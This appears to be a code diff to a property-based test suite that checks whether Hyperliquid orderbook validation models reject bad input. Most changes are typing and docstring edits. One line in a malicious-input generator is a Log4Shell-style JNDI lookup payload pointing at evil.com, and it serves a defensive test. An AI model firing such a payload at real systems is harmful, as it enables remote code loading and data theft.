@@ -1,7 +1,8 @@
 """Property-based tests for Hyperliquid raw orderbook models.
 
 These tests validate critical security boundary models that process external orderbook data.
-The models tested here are essential for real-time market data, order book snapshots, and price level tracking.
+The models tested here are essential for real-time market data, order book snapshots,
+and price level tracking.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious orderbook data that could manipulate price feeds and market information
@@ -16,21 +17,21 @@ Property testing ensures comprehensive coverage of orderbook edge cases and adve
 
 import json
 from decimal import Decimal
-from typing import Any
+from typing import Any, cast
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
+from cyberdelta.apis.exceptions.parsing import (
+    SequenceLengthError,
+    StructureTypeError,
+)
 from cyberdelta.apis.hyperliquid.models.hl_raw_orderbook import (
     HyperliquidRawBookLevel,
     HyperliquidRawL2Book,
     HyperliquidRawL2BookRequestPayload,
-)
-from cyberdelta.apis.exceptions.parsing import (
-    SequenceLengthError,
-    StructureTypeError,
 )
 from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError, ParsingError
@@ -42,7 +43,11 @@ from cyberdelta.exceptions.parsing import EmptyStringError, ParsingError
 
 
 def coin_strategy() -> SearchStrategy[str]:
-    """Generate valid coin/asset strings for orderbook."""
+    """Generate valid coin/asset strings for orderbook.
+
+    Returns:
+        A Hypothesis strategy for valid coin/asset symbol strings.
+    """
     return st.one_of([
         # Common cryptocurrencies
         st.sampled_from([
@@ -79,13 +84,15 @@ def coin_strategy() -> SearchStrategy[str]:
 
 
 def price_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for orderbook prices."""
+    """Generate decimal strings for orderbook prices.
+
+    Returns:
+        A Hypothesis strategy for decimal strings representing prices.
+    """
     return st.one_of([
         # Common price values
-        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("1000000"), places=8).map(
-            str
-        ),
-        st.decimals(min_value=Decimal("0.01"), max_value=Decimal("100000"), places=6).map(str),
+        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
+        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
         # Common values
         st.just("0.01"),  # Small price
         st.just("1.0"),  # Unit price
@@ -104,13 +111,15 @@ def price_decimal_strategy() -> SearchStrategy[str]:
 
 
 def size_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for orderbook sizes (positive only)."""
+    """Generate decimal strings for orderbook sizes (positive only).
+
+    Returns:
+        A Hypothesis strategy for positive decimal strings representing sizes.
+    """
     return st.one_of([
         # Common size values
-        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("1000000"), places=8).map(
-            str
-        ),
-        st.decimals(min_value=Decimal("0.01"), max_value=Decimal("100000"), places=6).map(str),
+        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
+        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
         # Common values
         st.just("0.01"),  # Small size
         st.just("1.0"),  # Unit size
@@ -125,7 +134,11 @@ def size_decimal_strategy() -> SearchStrategy[str]:
 
 
 def timestamp_strategy() -> SearchStrategy[int]:
-    """Generate valid timestamp values."""
+    """Generate valid timestamp values.
+
+    Returns:
+        A Hypothesis strategy for valid timestamp integers.
+    """
     return st.one_of([
         # Valid timestamp ranges
         st.integers(min_value=0, max_value=2**31 - 1),
@@ -141,8 +154,12 @@ def timestamp_strategy() -> SearchStrategy[int]:
 
 
 @st.composite
-def valid_book_level_data(draw) -> dict[str, Any]:
-    """Generate valid book level data."""
+def valid_book_level_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid book level data.
+
+    Returns:
+        A dictionary with valid orderbook level data.
+    """
     return {
         "px": draw(price_decimal_strategy()),
         "sz": draw(size_decimal_strategy()),
@@ -151,16 +168,24 @@ def valid_book_level_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_orderbook_levels_data(draw) -> list[list[dict[str, Any]]]:
-    """Generate valid orderbook levels structure [bids, asks]."""
+def valid_orderbook_levels_data(draw: st.DrawFn) -> list[list[dict[str, Any]]]:
+    """Generate valid orderbook levels structure [bids, asks].
+
+    Returns:
+        A list containing two lists: [bids, asks] with orderbook level data.
+    """
     bids = draw(st.lists(valid_book_level_data(), min_size=0, max_size=20))
     asks = draw(st.lists(valid_book_level_data(), min_size=0, max_size=20))
     return [bids, asks]
 
 
 @st.composite
-def valid_l2book_data(draw) -> dict[str, Any]:
-    """Generate valid L2 book data."""
+def valid_l2book_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid L2 book data.
+
+    Returns:
+        A dictionary with valid L2 orderbook data.
+    """
     return {
         "coin": draw(coin_strategy()),
         "levels": draw(valid_orderbook_levels_data()),
@@ -169,16 +194,24 @@ def valid_l2book_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_l2book_request_data(draw) -> dict[str, Any]:
-    """Generate valid L2 book request payload data."""
+def valid_l2book_request_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid L2 book request payload data.
+
+    Returns:
+        A dictionary with valid L2 book request payload data.
+    """
     return {
         "type": "l2Book",
         "coin": draw(coin_strategy()),
     }
 
 
-def malicious_orderbook_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for orderbook security testing."""
+def malicious_orderbook_strategy() -> SearchStrategy[object]:
+    """Generate malicious values for orderbook security testing.
+
+    Returns:
+        A Hypothesis strategy for malicious values to test security boundaries.
+    """
     return st.one_of([
         # Orderbook manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-orderbook}"),
@@ -229,7 +262,7 @@ class TestHyperliquidRawBookLevelProperties:
 
     @given(level_data=valid_book_level_data())
     def test_book_level_validation_success_properties(self, level_data: dict[str, Any]) -> None:
-        """Property: Valid book level data should always create valid HyperliquidRawBookLevel objects."""
+        """Property: Valid book level data should always create valid BookLevel objects."""
         # Skip invalid data
         try:
             # Validate price and size fields
@@ -268,7 +301,7 @@ class TestHyperliquidRawBookLevelProperties:
         malicious_value=malicious_orderbook_strategy(),
     )
     def test_book_level_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Book level model should reject malicious inputs safely."""
         base_data = {
@@ -276,7 +309,7 @@ class TestHyperliquidRawBookLevelProperties:
             "sz": "1.0",
             "n": 1,
         }
-        base_data[field_name] = malicious_value
+        base_data[field_name] = cast(Any, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((
@@ -417,19 +450,23 @@ class TestHyperliquidRawL2BookProperties:
 
             # Validate levels structure
             levels = l2book_data["levels"]
-            assume(isinstance(levels, list) and len(levels) == 2)
-            for level_list in levels:
-                assume(isinstance(level_list, list))
+            assert isinstance(levels, list)
+            levels_typed = cast(list[list[dict[str, Any]]], levels)
+            assume(len(levels_typed) == 2)
+            for level_list in levels_typed:
+                assert isinstance(level_list, list)
                 for level in level_list:
-                    assume(isinstance(level, dict))
+                    assert isinstance(level, dict)
                     for field in ["px", "sz"]:
                         value = level[field]
-                        assume(isinstance(value, str) and value.strip())
+                        assert isinstance(value, str)
+                        assume(value.strip())
                         decimal_val = Decimal(value)
                         assume(decimal_val.is_finite())
                         if field == "sz":
                             assume(decimal_val > 0)
-                    assume(isinstance(level["n"], int) and level["n"] >= 0)
+                    assert isinstance(level["n"], int)
+                    assume(level["n"] >= 0)
         except (ValueError, TypeError, KeyError):
             assume(False)
 
@@ -449,7 +486,7 @@ class TestHyperliquidRawL2BookProperties:
         malicious_value=malicious_orderbook_strategy(),
     )
     def test_l2book_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: L2 book model should reject malicious inputs safely."""
         base_data = {
@@ -460,7 +497,7 @@ class TestHyperliquidRawL2BookProperties:
             ],
             "time": 1641886630,
         }
-        base_data[field_name] = malicious_value
+        base_data[field_name] = cast(Any, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((
@@ -488,20 +525,24 @@ class TestHyperliquidRawL2BookProperties:
             st.just(["not_a_list", []]),  # First element not a list
         ])
     )
-    def test_l2book_levels_structure_validation_properties(self, levels_structure: Any) -> None:
+    def test_l2book_levels_structure_validation_properties(self, levels_structure: object) -> None:
         """Property: L2 book levels structure should validate correctly."""
-        l2book_data = {
+        l2book_data: dict[str, str | object | int] = {
             "coin": "ETH",
             "levels": levels_structure,
             "time": 1641886630,
         }
 
         # Check if structure is valid (exactly 2 lists)
-        is_valid = (
-            isinstance(levels_structure, list)
-            and len(levels_structure) == 2
-            and all(isinstance(sublist, list) for sublist in levels_structure)
-        )
+        if isinstance(levels_structure, list):
+            # Pyright needs explicit cast for list[Unknown] -> list[Any]
+            levels_cast = cast(list[Any], levels_structure)
+            is_valid = (
+                len(levels_cast) == 2
+                and all(isinstance(sublist, list) for sublist in levels_cast)
+            )
+        else:
+            is_valid = False
 
         if is_valid:
             # Property: Valid structures should be accepted
@@ -526,7 +567,10 @@ class TestHyperliquidRawL2BookProperties:
         # Skip invalid data
         try:
             assume(isinstance(l2book_data["coin"], str) and l2book_data["coin"].strip())
-            assume(isinstance(l2book_data["levels"], list) and len(l2book_data["levels"]) == 2)
+            levels = l2book_data["levels"]
+            assert isinstance(levels, list)
+            # Pyright needs explicit cast for list[Unknown] -> list[Any] 
+            assume(len(cast(list[Any], levels)) == 2)
         except (TypeError, KeyError):
             assume(False)
 
@@ -552,7 +596,7 @@ class TestHyperliquidRawL2BookRequestPayloadProperties:
     def test_l2book_request_validation_success_properties(
         self, request_data: dict[str, Any]
     ) -> None:
-        """Property: Valid L2 book request data should always create valid HyperliquidRawL2BookRequestPayload objects."""
+        """Property: Valid L2 book request data should create valid L2BookRequestPayload objects."""
         # Skip invalid data
         try:
             assume(isinstance(request_data["coin"], str) and request_data["coin"].strip())
@@ -573,14 +617,14 @@ class TestHyperliquidRawL2BookRequestPayloadProperties:
         field_name=st.sampled_from(["type", "coin"]), malicious_value=malicious_orderbook_strategy()
     )
     def test_l2book_request_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: L2 book request model should reject malicious inputs safely."""
         base_data = {
             "type": "l2Book",
             "coin": "ETH",
         }
-        base_data[field_name] = malicious_value
+        base_data[field_name] = cast(Any, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
@@ -642,13 +686,16 @@ class TestHyperliquidRawOrderbookIntegrationProperties:
 
     @given(l2book_data=valid_l2book_data(), malicious_level=malicious_orderbook_strategy())
     def test_orderbook_models_integration_properties(
-        self, l2book_data: dict[str, Any], malicious_level: Any
+        self, l2book_data: dict[str, Any], malicious_level: object
     ) -> None:
         """Property: Orderbook models should work consistently together."""
         # Skip invalid data
         try:
             assume(isinstance(l2book_data["coin"], str) and l2book_data["coin"].strip())
-            assume(isinstance(l2book_data["levels"], list) and len(l2book_data["levels"]) == 2)
+            levels = l2book_data["levels"]
+            assert isinstance(levels, list)
+            # Pyright needs explicit cast for list[Unknown] -> list[Any] 
+            assume(len(cast(list[Any], levels)) == 2)
         except (TypeError, KeyError):
             assume(False)
 
@@ -780,7 +827,7 @@ def test_HyperliquidRawL2BookRequestPayload_real_world_example() -> None:
 
 def test_HyperliquidRawL2Book_empty_levels_example() -> None:
     """Test with empty bid/ask levels."""
-    payload = {
+    payload: dict[str, str | list[list[dict[str, str | int]]] | int] = {
         "coin": "BTC",
         "levels": [[], []],
         "time": 1741886630,
@@ -858,7 +905,7 @@ def test_HyperliquidRawBookLevel_zero_values_example() -> None:
 
 def test_HyperliquidRawL2Book_timestamp_edge_cases() -> None:
     """Test with edge case timestamp values."""
-    payload = {
+    payload: dict[str, str | list[list[dict[str, str | int]]] | int] = {
         "coin": "AVAX",
         "levels": [[], []],
         "time": 0,  # Zero timestamp
